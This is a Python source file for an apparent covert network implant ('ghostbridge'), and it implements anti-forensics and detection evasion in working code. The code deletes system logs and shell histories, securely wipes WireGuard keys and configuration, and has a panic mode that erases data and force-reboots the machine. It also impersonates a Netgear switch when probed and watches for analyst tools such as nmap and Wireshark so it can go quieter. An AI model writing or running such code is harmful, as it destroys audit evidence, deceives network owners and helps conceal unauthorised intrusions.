"""
Stealth Module - Anti-forensics and detection evasion

Provides:
- RAM-only operation mode
- Log suppression
- Secure data wiping
- Fake identity responses
- Panic/kill switch
"""

from __future__ import annotations

import asyncio
import logging
import os
import random
import shutil
import subprocess
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Callable, Optional

logger = logging.getLogger(__name__)


class StealthLevel(Enum):
    """Stealth operation level."""

    NORMAL = "normal"  # Standard operation
    ELEVATED = "elevated"  # Reduced activity, longer intervals
    MAXIMUM = "maximum"  # Minimal footprint, essential only
    HIBERNATE = "hibernate"  # Near-silent, daily check-in only


class ThreatLevel(Enum):
    """Detected threat level."""

    NONE = "none"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class StealthStatus:
    """Current stealth status."""

    level: StealthLevel
    threat_level: ThreatLevel
    ram_only: bool
    logs_suppressed: bool
    fake_identity_active: bool
    last_threat_check: Optional[datetime]
    anomalies_detected: int


class StealthManager:
    """
    Manages anti-forensics and stealth operations.

    Features:
    - RAM-only operation (no disk writes)
    - Log suppression
    - Secure wiping
    - Fake identity for probes
    - Panic mode
    """

    # Paths to suppress/wipe
    SENSITIVE_PATHS = [
        "/var/log",
        "/tmp",
        "/var/tmp",
        "/root/.bash_history",
        "/home/*/.bash_history",
        "/var/ghostbridge/log",
    ]

    # Files that should never exist
    FORBIDDEN_FILES = [
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
    ]

    def __init__(
        self,
        ram_only: bool = True,
        fake_identity: str = "Netgear GS105",
        panic_on_tamper: bool = True,
    ):
        """
        Initialize StealthManager.

        Args:
            ram_only: Keep all logs in RAM only
            fake_identity: Identity to present if probed
            panic_on_tamper: Trigger panic on tamper detection
        """
        self.ram_only = ram_only
        self.fake_identity = fake_identity
        self.panic_on_tamper = panic_on_tamper

        self._level = StealthLevel.NORMAL
        self._threat_level = ThreatLevel.NONE
        self._logs_suppressed = False
        self._anomalies = 0
        self._last_check: Optional[datetime] = None
        self._panic_callbacks: list[Callable[[], None]] = []
        self._monitor_task: Optional[asyncio.Task] = None

    @property
    def level(self) -> StealthLevel:
        """Get current stealth level."""
        return self._level

    @property
    def threat_level(self) -> ThreatLevel:
        """Get current threat level."""
        return self._threat_level

    def set_level(self, level: StealthLevel) -> None:
        """Set stealth level."""
        old_level = self._level
        self._level = level
        logger.info(f"Stealth level: {old_level.value} -> {level.value}")

    def register_panic_callback(self, callback: Callable[[], None]) -> None:
        """Register callback to be called on panic."""
        self._panic_callbacks.append(callback)

    def get_status(self) -> StealthStatus:
        """Get current stealth status."""
        return StealthStatus(
            level=self._level,
            threat_level=self._threat_level,
            ram_only=self.ram_only,
            logs_suppressed=self._logs_suppressed,
            fake_identity_active=True,
            last_threat_check=self._last_check,
            anomalies_detected=self._anomalies,
        )

    # ===== Log Suppression =====

    async def suppress_logs(self) -> int:
        """
        Suppress system logs.

        Returns:
            Number of files wiped
        """
        wiped = 0

        for path_pattern in self.SENSITIVE_PATHS:
            # Expand glob patterns
            if "*" in path_pattern:
                import glob
                paths = glob.glob(path_pattern)
            else:
                paths = [path_pattern]

            for path_str in paths:
                path = Path(path_str)
                if path.exists():
                    try:
                        if path.is_file():
                            path.unlink()
                            wiped += 1
                        elif path.is_dir():
                            for file in path.rglob("*"):
                                if file.is_file():
                                    try:
                                        file.unlink()
                                        wiped += 1
                                    except (PermissionError, OSError):
                                        pass
                    except (PermissionError, OSError):
                        pass

        # Clear shell history
        history_files = [
            Path.home() / ".bash_history",
            Path.home() / ".zsh_history",
            Path("/root/.bash_history"),
        ]

        for hf in history_files:
            if hf.exists():
                try:
                    hf.unlink()
                    wiped += 1
                except (PermissionError, OSError):
                    pass

        self._logs_suppressed = True
        logger.info(f"Suppressed {wiped} log files")
        return wiped

    async def setup_ram_logging(self) -> bool:
        """
        Setup RAM-based logging (tmpfs).

        Returns:
            True if successful
        """
        if not self.ram_only:
            return True

        try:
            # Check if /var/log is already tmpfs
            result = subprocess.run(
                ["findmnt", "-n", "-o", "FSTYPE", "/var/log"],
                capture_output=True,
                text=True,
            )

            if "tmpfs" in result.stdout:
                logger.info("/var/log already on tmpfs")
                return True

            # Mount tmpfs on /var/log
            # This requires root and is typically done at boot
            logger.warning("RAM logging setup requires system configuration")
            return False

        except Exception as e:
            logger.error(f"RAM logging setup failed: {e}")
            return False

    # ===== Secure Wiping =====

    async def secure_wipe_file(self, path: Path, passes: int = 3) -> bool:
        """
        Securely wipe a file with multiple passes.

        Args:
            path: File to wipe
            passes: Number of overwrite passes

        Returns:
            True if successful
        """
        if not path.exists():
            return True

        try:
            file_size = path.stat().st_size

            for pass_num in range(passes):
                with open(path, "wb") as f:
                    if pass_num == 0:
                        # First pass: zeros
                        f.write(b"\x00" * file_size)
                    elif pass_num == 1:
                        # Second pass: ones
                        f.write(b"\xff" * file_size)
                    else:
                        # Subsequent passes: random
                        f.write(os.urandom(file_size))

                    f.flush()
                    os.fsync(f.fileno())

            # Finally delete
            path.unlink()
            logger.debug(f"Securely wiped: {path}")
            return True

        except Exception as e:
            logger.error(f"Secure wipe failed for {path}: {e}")
            return False

    async def secure_wipe_directory(self, path: Path) -> int:
        """
        Securely wipe all files in a directory.

        Args:
            path: Directory to wipe

        Returns:
            Number of files wiped
        """
        if not path.exists():
            return 0

        wiped = 0

        for file in path.rglob("*"):
            if file.is_file():
                if await self.secure_wipe_file(file):
                    wiped += 1

        # Remove empty directories
        for dir_path in sorted(path.rglob("*"), reverse=True):
            if dir_path.is_dir():
                try:
                    dir_path.rmdir()
                except OSError:
                    pass

        try:
            path.rmdir()
        except OSError:
            pass

        return wiped

    # ===== Panic Mode =====

    async def panic(self, reason: str = "manual") -> None:
        """
        Execute panic sequence - wipe everything and shutdown.

        Args:
            reason: Reason for panic
        """
        logger.critical(f"PANIC TRIGGERED: {reason}")

        # 1. Stop all services
        for callback in self._panic_callbacks:
            try:
                callback()
            except Exception as e:
                logger.error(f"Panic callback failed: {e}")

        # 2. Wipe sensitive data
        await self._wipe_all_sensitive_data()

        # 3. Wipe configuration
        config_paths = [
            Path("/etc/ghostbridge"),
            Path("/etc/wireguard"),
            Path("/opt/ghostbridge"),
        ]

        for path in config_paths:
            if path.exists():
                try:
                    shutil.rmtree(path, ignore_errors=True)
                except Exception:
                    pass

        # 4. Clear memory (best effort)
        try:
            subprocess.run(["sync"], check=False)
            # Drop caches
            Path("/proc/sys/vm/drop_caches").write_text("3")
        except Exception:
            pass

        # 5. Reboot or halt
        logger.critical("Panic complete - rebooting")
        subprocess.run(["reboot", "-f"], check=False)

    async def _wipe_all_sensitive_data(self) -> None:
        """Wipe all sensitive data."""
        # Wipe keys
        key_paths = [
            Path("/etc/ghostbridge/wg_private.key"),
            Path("/etc/wireguard/wg0.conf"),
            Path("/etc/ghostbridge/device.key"),
        ]

        for key_path in key_paths:
            await self.secure_wipe_file(key_path)

        # Wipe logs
        await self.suppress_logs()

        # Wipe data directory
        await self.secure_wipe_directory(Path("/var/ghostbridge"))

    # ===== Fake Identity =====

    def get_fake_identity(self) -> dict:
        """
        Get fake device identity for probes.

        Returns:
            Fake device information
        """
        identities = {
            "Netgear GS105": {
                "vendor": "NETGEAR",
                "model": "GS105v5",
                "type": "Unmanaged Switch",
                "ports": 5,
                "speed": "Gigabit",
            },
            "TP-Link TL-SG105": {
                "vendor": "TP-LINK",
                "model": "TL-SG105",
                "type": "Unmanaged Switch",
                "ports": 5,
                "speed": "Gigabit",
            },
            "D-Link DGS-105": {
                "vendor": "D-Link",
                "model": "DGS-105",
                "type": "Unmanaged Switch",
                "ports": 5,
                "speed": "Gigabit",
            },
        }

        return identities.get(self.fake_identity, identities["Netgear GS105"])

    async def respond_to_probe(self, probe_type: str) -> Optional[bytes]:
        """
        Generate fake response to network probe.

        Args:
            probe_type: Type of probe (snmp, http, etc.)

        Returns:
            Fake response bytes or None
        """
        identity = self.get_fake_identity()

        if probe_type == "snmp":
            # Basic SNMP-like response
            return f"sysDescr: {identity['vendor']} {identity['model']}".encode()

        elif probe_type == "http":
            # Return 404 or connection refused (no response)
            return None

        elif probe_type == "banner":
            return f"{identity['vendor']} {identity['model']}\n".encode()

        return None

    # ===== Threat Detection =====

    async def check_threats(self) -> ThreatLevel:
        """
        Check for potential threats/detection.

        Returns:
            Detected threat level
        """
        self._last_check = datetime.now()
        threats = []

        # Check for suspicious processes
        suspicious_procs = ["nmap", "wireshark", "tcpdump", "tshark", "ettercap"]
        try:
            result = subprocess.run(
                ["ps", "aux"],
                capture_output=True,
                text=True,
            )
            for proc in suspicious_procs:
                if proc in result.stdout.lower():
                    threats.append(f"Suspicious process: {proc}")
        except Exception:
            pass

        # Check for new network listeners
        try:
            result = subprocess.run(
                ["ss", "-tlnp"],
                capture_output=True,
                text=True,
            )
            # Count listening ports (excluding our known ports)
            lines = result.stdout.strip().split("\n")
            if len(lines) > 5:  # More than expected
                threats.append("Unusual number of listening ports")
        except Exception:
            pass

        # Check for login attempts
        try:
            auth_log = Path("/var/log/auth.log")
            if auth_log.exists():
                content = auth_log.read_text()
                if "Failed password" in content:
                    threats.append("Failed login attempts detected")
        except Exception:
            pass

        # Determine threat level
        self._anomalies = len(threats)

        if len(threats) == 0:
            self._threat_level = ThreatLevel.NONE
        elif len(threats) == 1:
            self._threat_level = ThreatLevel.LOW
        elif len(threats) <= 3:
            self._threat_level = ThreatLevel.MEDIUM
        else:
            self._threat_level = ThreatLevel.HIGH

        if self._threat_level in (ThreatLevel.HIGH, ThreatLevel.CRITICAL):
            logger.warning(f"High threat level detected: {threats}")

            if self.panic_on_tamper and self._threat_level == ThreatLevel.CRITICAL:
                await self.panic("Critical threat detected")

        return self._threat_level

    async def start_monitoring(self, interval: float = 300) -> None:
        """
        Start background threat monitoring.

        Args:
            interval: Check interval in seconds
        """
        if self._monitor_task is not None:
            return

        async def monitor_loop() -> None:
            while True:
                try:
                    await asyncio.sleep(interval)
                    await self.check_threats()

                    # Auto-adjust stealth level based on threats
                    if self._threat_level == ThreatLevel.HIGH:
                        self.set_level(StealthLevel.MAXIMUM)
                    elif self._threat_level == ThreatLevel.MEDIUM:
                        self.set_level(StealthLevel.ELEVATED)

                except asyncio.CancelledError:
                    break
                except Exception as e:
                    logger.error(f"Threat monitor error: {e}")

        self._monitor_task = asyncio.create_task(monitor_loop())
        logger.info("Threat monitoring started")

    async def stop_monitoring(self) -> None:
        """Stop threat monitoring."""
        if self._monitor_task is not None:
            self._monitor_task.cancel()
            try:
                await self._monitor_task
            except asyncio.CancelledError:
                pass
            self._monitor_task = None

    # ===== Timing Obfuscation =====

    @staticmethod
    def add_jitter(base_value: float, jitter_percent: float = 0.2) -> float:
        """
        Add random jitter to a timing value.

        Args:
            base_value: Base timing value
            jitter_percent: Jitter percentage (0.0-1.0)

        Returns:
            Value with jitter applied
        """
        jitter = base_value * jitter_percent
        return base_value + random.uniform(-jitter, jitter)

    @staticmethod
    async def random_delay(min_seconds: float = 0.1, max_seconds: float = 2.0) -> None:
        """
        Add random delay to avoid timing analysis.

        Args:
            min_seconds: Minimum delay
            max_seconds: Maximum delay
        """
        delay = random.uniform(min_seconds, max_seconds)
        await asyncio.sleep(delay)

